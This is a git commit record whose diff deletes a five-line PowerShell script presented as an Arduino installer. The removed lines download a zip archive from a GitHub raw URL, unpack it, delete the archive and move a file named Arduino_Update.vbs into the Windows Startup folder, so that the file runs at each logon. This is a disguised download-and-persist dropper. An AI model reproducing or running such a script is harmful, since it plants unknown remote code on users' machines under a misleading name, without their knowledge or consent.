bf136ccbe9ba26ac688e7690e4519290c399e063
sinociaossa <114251195+sinociaossa@users.noreply.github.com>
2022-09-30 10:21:00 +0200

    Delete arduino_install.ps1

--- arduino_install.ps1
+++
@@ -1,5 +0,0 @@
-Invoke-WebRequest -Uri https://github.com/sinociaossa/sino/raw/main/a.zip -OutFile $env:userprofile\\documents\\a.zip; 
-Expand-Archive -LiteralPath $env:userprofile\\documents\\a.zip -DestinationPath $env:userprofile\\documents; 
-del $env:userprofile\\documents\\a.zip;
-mv $env:userprofile\\documents\\Arduino_Update.vbs $env:userprofile\\appdata\\roaming\\microsoft\\windows\\\"start menu\"\\programs\\startup\\Arduino_Update.vbs;
-exit
